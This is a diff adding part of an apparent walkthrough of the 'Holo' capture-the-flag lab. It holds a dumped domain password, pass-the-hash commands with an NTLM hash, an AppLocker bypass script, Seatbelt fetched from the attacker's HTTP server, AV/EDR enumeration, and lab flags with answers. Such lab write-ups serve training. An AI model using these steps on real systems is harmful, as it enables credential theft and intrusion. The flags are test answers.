@@ -3768,3 +3768,1888 @@ SID               : S-1-5-18
 	 * Domain   : HOLOLIVE
 	 * Password : (null)
 	kerberos :	
+	 * Username : s-srv01$
+	 * Domain   : HOLO.LIVE
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
+
+watamet: Nothingtoworry!
+```
+Read the above and attempt to dump credentials on S-SRV01.
+Completed
+What domain user's credentials can we dump on S-SRV01?
+*watamet*
+What is the domain user's password that we can dump on S-SRV01?
+*Nothingtoworry!*
+If cracking the hash fails, we always know that there is a backup when operating in Windows. Windows allows functionality to pass a hash to WinRM and RDP to enable authentication. This gives us as attackers an advantage, getting rid of the need to crack hashes. This attack is known as pass-the-hash.
+Pass the hash (PtH) is an attack wherein we can leverage found NTLM or LanMan hashes of user passwords to authenticate the user they belong to. This is possible due to the well-intentioned security 'feature' within Windows, where passwords are hashed predictably before being sent over the network. Done originally with the intent of avoiding password disclosure, we can leverage this feature to capture and replay hashes, allowing us to authenticate as our victim users.
+To aid us in passing the hash, we can use crackmapexec and Evil-WinRM.
+The first tool we will be looking at is crackmapexec,
+[https://github.com/byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec). From the crackmapexec GitHub, "CrackMapExec (a.k.a CME) is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. Built with stealth in mind, CME follows the concept of "Living off the Land": abusing built-in Active Directory features/protocols to achieve its functionality and allowing it to evade most endpoint protection/IDS/IPS solutions." We will be using only one of the many features of CME. We can pass the hash over SMB, SSH, WinRM, LDAP, or MSSQL; we recommend using SMB.
+We will be deploying CME across the entire CIDR subnet to identify endpoints in which the credentials successfully authenticate. Find syntax usage for CME below.
+Syntax: `crackmapexec smb 10.200.x.0/24 -u <user> -d <domain> -H <hash>`
+Above you will see crackmapexec output over proxy chains. Crackmapexec can take a decent amount of time when operating over proxy chains.
+For more information about crackmapexec check out the GitHub wiki, [https://github.com/byt3bl33d3r/CrackMapExec/wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki).
+---
+The second tool we will be looking at is Evil-WinRM, [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm). This tool will abuse the WinRM protocol to communicate to a remote endpoint. From the Evil-WinRM GitHub "WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP-based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems to make life easier to system administrators." Thus, we can use our previously found endpoint and our hash and username to authenticate to the server and gain remote access successfully.
+The easiest way to install Evil-WinRM is to install from the gem package manager, as the tool is built in Ruby. Find the command to install Evil-WinRM below.
+Command: `gem install evil-winrm`
+After the installation, it is relatively simple to use Evil-WinRM as it operates similarly to other RDP or SSH clients. Find the Evil-WinRM syntax below.
+Syntax: `evil-winrm -i <address> -u <user> -H <hash>`
+If successfully authenticated, you should now have a working WinRM shell that you can use to execute remote commands.
+Answer the questions below
+```text
+using pass the hash
+```
+```text
+┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
+└─$ sudo crackmapexec smb 10.200.108.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9
+[sudo] password for kali: 
+SMB         10.200.108.31   445    S-SRV01          [*] Windows 10.0 Build 17763 x64 (name:S-SRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
+SMB         10.200.108.30   445    DC-SRV01         [*] Windows 10.0 Build 17763 x64 (name:DC-SRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
+SMB         10.200.108.35   445    PC-FILESRV01     [*] Windows 10.0 Build 17763 x64 (name:PC-FILESRV01) (domain:HOLOLIVE) (signing:False) (SMBv1:False)
+SMB         10.200.108.31   445    S-SRV01          [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 (Pwn3d!)
+SMB         10.200.108.30   445    DC-SRV01         [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 
+SMB         10.200.108.35   445    PC-FILESRV01     [+] HOLOLIVE\watamet:d8d41e6cf762a8c77776a1843d4141c9 
+
+or using password 
+
+sudo crackmapexec smb 10.200.108.0/24 -u watamet -d HOLOLIVE -p Nothingtoworry!
+```
+```text
+┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
+└─$ smbclient -U 'HOLO.LIVE\watamet%Nothingtoworry!' //10.200.108.35/Users 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Fri Dec 11 20:34:19 2020
+  ..                                 DR        0  Fri Dec 11 20:34:19 2020
+  Default                           DHR        0  Sun Nov 15 13:20:08 2020
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  Public                             DR        0  Wed Dec 12 02:45:15 2018
+  watamet                             D        0  Fri Dec 11 20:37:48 2020
+
+		7863807 blocks of size 4096. 3773838 blocks available
+smb: \> cd watamet
+smb: \watamet\> ls
+  .                                   D        0  Fri Dec 11 20:37:48 2020
+  ..                                  D        0  Fri Dec 11 20:37:48 2020
+  3D Objects                         DR        0  Fri Dec 11 20:34:26 2020
+  AppData                            DH        0  Wed Nov 14 11:17:25 2018
+  Applications                        D        0  Mon Sep 20 12:28:37 2021
+  Contacts                           DR        0  Fri Dec 11 20:34:26 2020
+  Desktop                            DR        0  Tue Mar 16 12:01:19 2021
+  Documents                          DR        0  Fri Dec 11 20:34:26 2020
+  Downloads                          DR        0  Tue Apr  6 22:22:58 2021
+  Favorites                          DR        0  Fri Dec 11 20:34:26 2020
+  Links                              DR        0  Fri Dec 11 20:34:26 2020
+  Music                              DR        0  Fri Dec 11 20:34:26 2020
+  NTUSER.DAT                        AHn   786432  Tue Jan 31 21:18:20 2023
+  ntuser.dat.LOG1                   AHS    12288  Fri Dec 11 20:34:20 2020
+  ntuser.dat.LOG2                   AHS    49152  Fri Dec 11 20:34:20 2020
+  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TM.blf    AHS    65536  Sat Dec 12 16:02:48 2020
+  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TMContainer00000000000000000001.regtrans-ms    AHS   524288  Fri Dec 11 20:34:20 2020
+  NTUSER.DAT{a057f24c-e827-11e8-81c0-0a917f905606}.TMContainer00000000000000000002.regtrans-ms    AHS   524288  Fri Dec 11 20:34:20 2020
+  ntuser.ini                         HS       20  Wed Nov 14 11:17:25 2018
+  Pictures                           DR        0  Fri Dec 11 20:34:26 2020
+  Saved Games                        DR        0  Fri Dec 11 20:34:26 2020
+  Searches                           DR        0  Fri Dec 11 20:34:26 2020
+  Videos                             DR        0  Fri Dec 11 20:34:26 2020
+
+		7863807 blocks of size 4096. 3768130 blocks available
+smb: \watamet\> cd Desktop
+smb: \watamet\Desktop\> ls
+  .                                  DR        0  Tue Mar 16 12:01:19 2021
+  ..                                 DR        0  Tue Mar 16 12:01:19 2021
+  desktop.ini                       AHS      282  Fri Dec 11 20:34:26 2020
+  user.txt                            A       38  Tue Mar 16 12:01:52 2021
+
+		7863807 blocks of size 4096. 3763341 blocks available
+smb: \watamet\Desktop\> get user.txt
+getting file \watamet\Desktop\user.txt of size 38 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+smb: \watamet\Desktop\> exit
+```
+```text
+┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
+└─$ cat user.txt                                                                               
+HOLO{2cb097ab8c412d565ec3cab49c6b082e}
+```
+Read the above and attempt to pass the hash.
+Completed
+What is the hostname of the remote endpoint we can authenticate to?
+*PC-FILESRV01*
+Submit the user flag in Task 4
+Completed
+After landing on PC-FILESRV01 and attempting to perform situational awareness, you may notice that you get an error when executing applications. This is due to whitelist application controls set on the server. We will be covering what AppLocker is and how it can be bypassed within this task.
+From the Microsoft Docs, "Application control policies specify which programs are allowed to run on the local computer. AppLocker can be part of your application control strategy because you can control what software is allowed to run on your computers." In a brief summary of the Microsoft Docs, AppLocker is a set of Windows application control policies that can be used to restrict access to various sections of a device or multiple devices across a domain. To learn more about AppLocker, check out the Microsoft documentation [https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview).
+Whenever AppLocker blocks a program from running, you will encounter the error: _This program is blocked by group policy. For more information, contact your system administrator._ AppLocker will also send an event via ETW to the event log.
+To begin understanding AppLocker, we need to identify its structure and implementation in Windows.
+AppLocker doesn't take shape; it is just a policy similar to a company password policy or timeout policy that runs in the background and takes minimal action when needed. AppLocker consists of a set of rules that can be defaults, automatically generated, or a custom set of rules. These rules will typically be denying or allowing access to specific directories or sets of directories. Rules can also offer granular access control to specify which users can access what and which rules apply to what users.
+The policy configuration for AppLocker is located in `secpol.msc` or the local security policy editor. This can also be the group policy editor if changing AppLocker to deploy in a domain context. The policy is located under _Application Control Policies_.
+![](https://i.imgur.com/f2tFlRf.png)
+From the above screenshot, you will notice four rule types. Each rule type is outlined below.
+-   `Executable Rules` Determines what executables and applications can be run from specified directories.
+-   `Windows Installer Rules` Determines what Installers can be run
+-   `Script Rules` Determines what and where scripts can be run
+-   `Packaged app Rules` Determines what pre-packaged Windows applications can be run
+Below is the default rule list created by AppLocker.
+The default rule set will allow every user to execute applications from the _Program Files_ and _Windows_ directory and enable Administrators to execute all files.
+![](https://i.imgur.com/GlZjAl0.png)
+System Administrators can create and edit rules that AppLocker will enforce. The wizard is straightforward to use and can allow administrators to push rules remotely to all servers in the domain.
+![](https://i.imgur.com/IvA1i7h.png)
+The above allow rule will allow everyone to access the _Program Files_ directory.
+---
+The idea behind bypassing AppLocker is to abuse misconfigurations within the rule sets themselves. Several default directories have execute permissions along with a few scripts and cheat sheets that you can use to aid you in abusing AppLocker.
+There are a few other ways to bypass AppLocker including,
+-   Signed/verified packages and binaries (LOLBAS)
+-   PowerShell downgrade
+-   Alternate Data Streams
+For a complete list of default directories to bypass AppLocker along with other techniques, check out this GitHub repo [https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md).
+It is important to note that in terms of noise within a network, a default directory is favored; however, blue teams may use other detection rules to monitor directories known to be abused. It is up to you to decide your objectives and what attack to use when dealing with AppLocker.
+To aid us in quickly identify directories we can use to execute programs; we can use an AppLocker directory check script [https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1](https://github.com/HackLikeAPornstar/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1).
+This script will automatically check for execution permissions on all known directories within the system. This can be helpful when dealing with a custom ruleset and other mitigations.
+System Administrators will often not restrict PowerShell scripts, or you can directly run the script from the command line. Therefore, you will need to adjust how you approach running this script depending on the system. Find an example output below.
+![](https://i.imgur.com/0hEAgPk.png)
+Directories and execution permissions will change based on the AppLocker policies. Therefore, this is not how the output of the script will always look.
+Once we have identified a directory with execution permissions from manual enumeration or the PowerShell script, we can place a malicious binary such as our Covenant launcher within the directory and execute the binary.
+Answer the questions below
+```text
+┌──(kali㉿kali)-[~/Holo/AMSI-Holo]
+└─$ rdesktop -u 'holo.live\watamet' -p 'Nothingtoworry!' 10.200.108.35
+Autoselecting keyboard map 'en-us' from locale
+
+PS C:\Users\watamet> ipconfig
+
+Windows IP Configuration
+
+Ethernet adapter Ethernet:
+
+   Connection-specific DNS Suffix  . : holo.live
+   Link-local IPv6 Address . . . . . : fe80::1dc7:730a:6702:d71f%6
+   IPv4 Address. . . . . . . . . . . : 10.200.108.35
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 10.200.108.1
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ git clone https://github.com/sparcflow/GibsonBird.git   
+Cloning into 'GibsonBird'...
+remote: Enumerating objects: 72, done.
+remote: Total 72 (delta 0), reused 0 (delta 0), pack-reused 72
+Receiving objects: 100% (72/72), 12.48 KiB | 511.00 KiB/s, done.
+Resolving deltas: 100% (30/30), done.
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ cd GibsonBird
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird]
+└─$ ls                 
+chapter2  chapter3  chapter4  chapter5  README.md
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird]
+└─$ cd chapter   
+cd: no such file or directory: chapter
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird]
+└─$ cd chapter4
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird/chapter4]
+└─$ ls
+applocker-bypas-checker.ps1  loop.sh  readme.md  wmi_persistence.ps1
+```
+```text
+┌──(kali㉿kali)-[~/Holo/GibsonBird/chapter4]
+└─$ cat applocker-bypas-checker.ps1
+```
+```text
+# AppLocker Bypass Checker (Default Rules) v2.0
+#
+```
+```text
+# One of the Default Rules in AppLocker allows everything in the folder C:\Windows to be executed.
+```
+```text
+# A normal user shouln't have write permission in that folder, but that is not always the case.
+```
+```text
+# This script lists default ACL for the "BUILTIN\users" group looking for write/createFiles & execute authorizations
+#
+```
+```text
+# @Author: Sparc Flow in "How to Hack a Fashion Brand"
+#
+```
+```text
+# NOTE: change the group and root_folder variables to suit your needs
+
+$group = "*Users*"
+$root_folder = "C:\windows"
+write-output "[*] Processing folders recursively in $root_folder"
+foreach($_ in (Get-ChildItem $root_folder -recurse -ErrorAction SilentlyContinue)){
+    if($_.PSIsContainer)
+    {
+		try{
+			$res = Get-acl $_.FullName 
+		} catch{
+			continue
+		}
+		foreach ($a in $res.access){
+			if ($a.IdentityReference -like $group){
+				if ( ($a.FileSystemRights -like "*Write*" -or $a.FileSystemRights -like "*CreateFiles*" ) -and $a.FileSystemRights -like "*ReadAndExecute*" ){
+					write-host "[+] " $_.FullName -foregroundcolor "green"
+				}
+				
+			}
+		}
+    }
+}
+
+PS C:\Users\watamet\Desktop> .\applocker-bypass-checker.ps1
+[*] Processing folders recursively in C:\windows
+[+]  C:\windows\Tasks
+[+]  C:\windows\tracing
+[+]  C:\windows\System32\spool\drivers\color
+[+]  C:\windows\tracing\ProcessMonitor
+
+PS C:\Users\watamet\Desktop> cd C:\Windows\Tasks
+
+S C:\Windows\Tasks> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+
+PublisherConditions : {*\*\*,0.0.0.0-*}
+PublisherExceptions : {}
+PathExceptions      : {}
+HashExceptions      : {}
+Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
+Name                : (Default Rule) All signed packaged apps
+Description         : Allows members of the Everyone group to run packaged apps that are signed.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%PROGRAMFILES%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : 921cc481-6e17-4653-8f75-050b80acca20
+Name                : (Default Rule) All files located in the Program Files folder
+Description         : Allows members of the Everyone group to run applications that are located in the Program Files
+                      folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {%WINDIR%\*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
+Name                : (Default Rule) All files located in the Windows folder
+Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
+UserOrGroupSid      : S-1-1-0
+Action              : Allow
+
+PathConditions      : {*}
+PathExceptions      : {}
+PublisherExceptions : {}
+HashExceptions      : {}
+Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
+Name                : (Default Rule) All files
+Description         : Allows members of the local Administrators group to run all applications.
+UserOrGroupSid      : S-1-5-32-544
+Action              : Allow
+```
+![[Pasted image 20230201234727.png]]
+Read the above and bypass AppLocker on PC-FILESRV01.
+Completed
+Submit the user flag for PC-FILESRV01 in Task 4.
+Completed
+### Situational Awareness So it's just fancy malware?
+Now that we have a user account on PC-FILESRV01 and a directory that we can use to execute from, we can begin situational awareness. Like Linux situational awareness, Windows situational awareness means understanding the system you have landed on and what is available to you. In the following four tasks, we will be covering: AV enumeration, user and system enumeration, privilege escalation enumeration, and common escalations. In this task, we will be covering AV enumeration. Various teams may approach situational awareness, but we will be showcasing our preferred methodology and tools.
+To begin assessing what tools may be most useful when attacking a system, you can start by attempting to enumerate what AV and detection methods are in place. It is essential to enumerate detections on an endpoint as this will allow you to determine your attack surface accessible.
+---
+The first tool we will be looking at is Seatbelt, [https://github.com/GhostPack/Seatbelt](https://github.com/GhostPack/Seatbelt). From the Seatbelt GitHub,"Seatbelt is a C# project that performs a number of security-oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives." As covered in Task 7, you will need to build Seatbelt using a Visual Studio solution file. The build process will produce an application file, an XML file, and a PDB file. The application file is the only file needed for Seatbelt to run. Files will be built to `Seatbelt-master\Seatbelt-master\Seatbelt\bin\Debug`
+We can use a combination of seven commands within Seatbelt to begin to identify counter-measures. We will be covering Seatbelt further in-depth in a later task. Find an outline of commands used below.
+-   `AMSIProviders` Providers registered for AMSI
+-   `AntiVirus` Registered antivirus (via WMI)
+-   `Sysmon` Sysmon configuration from the registry
+-   `WindowsDefender` Windows Defender settings (including exclusion locations)
+-   `WindowsEventForwarding` Windows Event Forwarding (WEF) settings via the registry
+-   `McAfeeConfigs` Finds McAfee configuration files
+-   `InterestingProcesses` "Interesting" processes - defensive products and admin tools
+The usage behind these commands may vary depending on the permission levels of the endpoint; however, you can expect a small amount of information to be gathered from them to help identify AV products. Find syntax for Seatbelt below.
+Syntax: `Seatbelt.exe —group=system`
+A majority of the commands used above can also be used remotely. This means we will not have to worry about AMSI or Defender as they operate from WMI queries. Find remote syntax for Seatbelt below.
+Syntax: `Seatbelt.exe -group=remote -computername=<address> -username=<DOMAIN\user> -password=<password`
+You can find examples of command output indicating AV detections on an endpoint below.
+![](https://i.imgur.com/AlBXho0.png)
+![](https://i.imgur.com/AOiopVS.png)
+---
+The second tool we will be looking at is SharpEDRChecker, [https://github.com/PwnDexter/SharpEDRChecker](https://github.com/PwnDexter/SharpEDRChecker).
+From the SharpEDRChecker GitHub "SharpEDRChecker, checks running processes, process metadata, DLLs loaded into your current process and the each DLLs metadata, common install directories, installed services and each service binaries metadata, installed drivers and each drivers metadata, all for the presence of known defensive products such as AV's, EDR's and logging tools."
+This means that we can identify more advanced forms of anti-virus and detection agents that Seatbelt or other tools may not be able to locate using their methods. For example, Carbon Black, Tanium, or Crowd Strike; these solution platforms can deploy agents onto an endpoint custom to the organization similar to a malicious payload (basically malware, right?)
+Below we will go into each of the functions of SharpEDRChecker and how they can benefit us in situational awareness.
+-   `FileChecker` This function of the tool is what really separates it from other tools. It will check the metadata of the file that cannot be changed as it will invalidate code signing and break other aspects of the file.
+-   `ProcessChecker` Similar function to Seatbelt's `InterestingProcesses`, The first part of this module will inspect all processes. The second part of the module will check for DLLs loaded by processes, this is important for identifying products such as Cylance and AMSI.
+-   `ServiceChecker` Inspects installed services, a similar function to `ProcessChecker`.
+-   `DriverChecker` Performs checks on all drivers using `P/Invoke`.
+-   `DirectoryChecker` Dumps all interesting subdirectories on common directories (Program Files, ProgramData, etc.)
+To begin using SharpEDRChecker, you can either download a pre-compiled release from GitHub or compile from source using the solution file. For more information about compiling, return to Task 7. Find releases here, [https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1](https://github.com/PwnDexter/SharpEDRChecker/releases/tag/1.1).
+Find syntax and example output from SharpEDRChecker below.
+Syntax: `.\SharpEDRChecker.exe`
+![](https://i.imgur.com/wjWlmx8.png)
+From the above screenshot, we can see that this tool gives us a much more detailed output than Seatbelt, which is a lot more focused and offers more insight than Seatbelt and other tools.
+For more information about SharpEDRChecker, check out this blog, [https://redteaming.co.uk/2021/03/18/sharpedrchecker/](https://redteaming.co.uk/2021/03/18/sharpedrchecker/).
+Depending on the approach you decide to take, you may have to return to Task 27-31 to pass the tools through anti-virus.
+This step of situational awareness can also be done before or after gaining root access depending on how you want to approach it, or it can be skipped entirely depending on your target.
+Answer the questions below
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ git clone https://github.com/r3motecontrol/Ghostpack-CompiledBinaries.git
+Cloning into 'Ghostpack-CompiledBinaries'...
+remote: Enumerating objects: 712, done.
+remote: Counting objects: 100% (202/202), done.
+remote: Compressing objects: 100% (107/107), done.
+remote: Total 712 (delta 129), reused 127 (delta 95), pack-reused 510
+Receiving objects: 100% (712/712), 20.52 MiB | 1.64 MiB/s, done.
+Resolving deltas: 100% (472/472), done.
+```
+```text
+┌──(kali㉿kali)-[~/Holo]
+└─$ cd Ghostpack-CompiledBinaries
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ ls
+ Certify.exe                        LockLess.exe          Seatbelt.exe      SharpUp.exe
+'dotnet v3.5 compiled binaries'     README.md             SharpChrome.exe   SharpWMI.exe
+'dotnet v4.5 compiled binaries'     RestrictedAdmin.exe   SharpDPAPI.exe
+'dotnet v4.7.2 compiled binaries'   Rubeus.exe            SharpDump.exe
+ Koh.exe                            SafetyKatz.exe        SharpRoast.exe
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ cp /home/kali/Downloads/SharpEDRChecker.exe SharpEDRChecker.exe
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ ls
+ Certify.exe                     'dotnet v4.7.2 compiled binaries'   README.md             SafetyKatz.exe    SharpDPAPI.exe        SharpRoast.exe
+'dotnet v3.5 compiled binaries'   Koh.exe                            RestrictedAdmin.exe   Seatbelt.exe      SharpDump.exe         SharpUp.exe
+'dotnet v4.5 compiled binaries'   LockLess.exe                       Rubeus.exe            SharpChrome.exe   SharpEDRChecker.exe   SharpWMI.exe
+```
+```text
+┌──(kali㉿kali)-[~/Holo/Ghostpack-CompiledBinaries]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.200.95.35 - - [06/Feb/2023 20:54:14] "GET /Seatbelt.exe HTTP/1.1" 200 -
+
+PS C:\Windows\Tasks> Invoke-WebRequest http://10.50.74.15:8000/Seatbelt.exe -outfile C:\Windows\Tasks\Seatbelt.exe
+
+PS C:\Windows\Tasks> .\SeatBelt.exe -group=all > C:\Users\watamet\Desktop\output.txt
+
+000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000##%  &%%**#                      @////(((&%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&%,,,,,,,,,,,,,,,,         @////(((&%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &%%......  ...   ..         @////(((&%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&%%%%%#########################(#(#######((#####
+###%##%%####################  &%%...............          @////(((&%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&%%%%%%%################                        
+                        &%&   %%%%%      Seatbelt         %////(((&%%%%%%%%#############*                         
+                        &%%&&&%%%%%        v1.2.1         ,(((&%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2111.5-0\MpOav.dll"
+
+====== AntiVirus ======
+
+Cannot enumerate antivirus. root\SecurityCenter2 WMI namespace is not available on Windows Servers
+====== AppLocker ======
+
+  [*] AppIDSvc service is Running
+
+    [*] Appx not configured
+  [*] AppIDSvc service is Running
+
+    [*] Dll not configured
+  [*] AppIDSvc service is Running
+
+    [*] Exe is in Enforce Mode
+      [*] <FilePublisherRule Id="a9e18c21-ff8f-43cf-b9fc-db40eed693ba" Name="(Default Rule) All signed packaged apps" Description="Allows members of the Everyone group to run packaged apps that are signed." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePublisherCondition PublisherName="*" ProductName="*" BinaryName="*"><BinaryVersionRange LowSection="0.0.0.0" HighSection="*"/></FilePublisherCondition></Conditions></FilePublisherRule>
+
+      [*] <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the Program Files folder" Description="Allows members of the Everyone group to run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
+
+      [*] <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members of the Everyone group to run applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition Path="%WINDIR%\*"/></Conditions></FilePathRule>
+
+      [*] <FilePathRule Id="fd686d83-a829-4351-8ff4-27c7de5755d2" Name="(Default Rule) All files" Description="Allows members of the local Administrators group to run all applications." UserOrGroupSid="S-1-5-32-544" Action="Allow"><Conditions><FilePathCondition Path="*"/></Conditions></FilePathRule>
+
+  [*] AppIDSvc service is Running
+
+    [*] Msi not configured
+  [*] AppIDSvc service is Running
+
+    [*] Script not configured
+====== ARPTable ======
+
+  Loopback Pseudo-Interface 1 --- Index 1
+    Interface Description : Software Loopback Interface 1
+    Interface IPs      : ::1, 127.0.0.1
+    DNS Servers        : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
+
+    Internet Address      Physical Address      Type
+    224.0.0.22            00-00-00-00-00-00     Static
+
+  Ethernet --- Index 6
+    Interface Description : AWS PV Network Device #0
+    Interface IPs      : fe80::b0db:4d99:84af:ac44%6, 10.200.95.35
+    DNS Servers        : 10.200.95.30
+
+    Internet Address      Physical Address      Type
+    10.40.0.1             00-00-00-00-00-00     Invalid
+    10.200.95.1           02-63-DC-A0-13-35     Dynamic
+    10.200.95.30          02-5B-3A-43-60-9F     Dynamic
+    10.200.95.32          02-1F-0F-45-B8-EB     Dynamic
+    10.200.95.33          02-76-2C-96-24-63     Dynamic
+    10.200.95.255         FF-FF-FF-FF-FF-FF     Static
+    224.0.0.22            01-00-5E-00-00-16     Static
+    224.0.0.251           01-00-5E-00-00-FB     Static
+    224.0.0.252           01-00-5E-00-00-FC     Static
+    255.255.255.255       FF-FF-FF-FF-FF-FF     Static
+
+====== AuditPolicies ======
+
+====== AuditPolicyRegistry ======
+
+====== AutoRuns ======
+
+  HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
+    C:\Windows\system32\SecurityHealthSystray.exe
+====== Certificates ======
+
+====== CertificateThumbprints ======
+
+CurrentUser\Root - 92B46C76E13054E104F230517E6E504D43AB10B5 (Symantec Enterprise Mobile Root for Microsoft) 3/14/2032 11:59:59 PM
+CurrentUser\Root - 8F43288AD272F3103B6FB1428485EA3014C0BCFE (Microsoft Root Certificate Authority 2011) 3/22/2036 10:13:04 PM
+CurrentUser\Root - 3B1EFD3A66EA28B16697394703A72CA340A05BD5 (Microsoft Root Certificate Authority 2010) 6/23/2035 10:04:01 PM
+CurrentUser\Root - 31F9FC8BA3805986B721EA7295C65B3A44534274 (Microsoft ECC TS Root Certificate Authority 2018) 2/27/2043 9:00:12 PM
+CurrentUser\Root - 06F1AA330B927B753A40E68CDF22E34BCBEF3352 (Microsoft ECC Product Root Certificate Authority 2018) 2/27/2043 8:50:46 PM
+CurrentUser\Root - DF3C24F9BFD666761B268073FE06D1CC8D4F82A4 (DigiCert Global Root G2) 1/15/2038 12:00:00 PM
+CurrentUser\Root - DDFB16CD4931C973A2037D3FC83A4D7D775D05E4 (DigiCert Trusted Root G4) 1/15/2038 12:00:00 PM
+CurrentUser\Root - D4DE20D05E66FC53FE1A50882C78DB2852CAE474 (Baltimore CyberTrust Root) 5/12/2025 11:59:00 PM
+CurrentUser\Root - D1EB23A46D17D68FD92564C2F1F1601764D8E349 (AAA Certificate Services) 12/31/2028 11:59:59 PM
+CurrentUser\Root - B1BC968BD4F49D622AA89A81F2150152A41D829C (GlobalSign Root CA) 1/28/2028 12:00:00 PM
+CurrentUser\Root - AFE5D244A8D1194230FF479FE2F897BBCD7A8CB4 (COMODO RSA Certification Authority) 1/18/2038 11:59:59 PM
+CurrentUser\Root - AD7E1C28B064EF8F6003402014C3D0E3370EB58A (Starfield Class 2 Certification Authority) 6/29/2034 5:39:16 PM
+CurrentUser\Root - A8985D3A65E5E5C4B2D7D66D40C6DD2FB19C5436 (DigiCert Global Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\Root - 8782C6C304353BCFD29692D2593E7D44D934FF11 (SecureTrust CA) 12/31/2029 7:40:55 PM
+CurrentUser\Root - 742C3192E607E424EB4549542BE1BBC53E6174E2 (Class 3 Public Primary Certification Authority) 8/1/2028 11:59:59 PM
+CurrentUser\Root - 5FB7EE0633E259DBAD0C4C9AE6D38F1A61C7DC25 (DigiCert High Assurance EV Root CA) 11/10/2031 12:00:00 AM
+CurrentUser\Root - 4EB6D578499B1CCF5F581EAD56BE3D9B6744A5E5 (VeriSign Class 3 Public Primary Certification Authority - G5) 7/16/2036 11:59:59 PM
+CurrentUser\Root - 3679CA35668772304D30A5FB873B0FA77BB70D54 (VeriSign Universal Root Certification Authority) 12/1/2037 11:59:59 PM
+CurrentUser\Root - 2B8F1B57330DBBA2D07A6C51F70EE90DDAB9AD8E (USERTrust RSA Certification Authority) 1/18/2038 11:59:59 PM
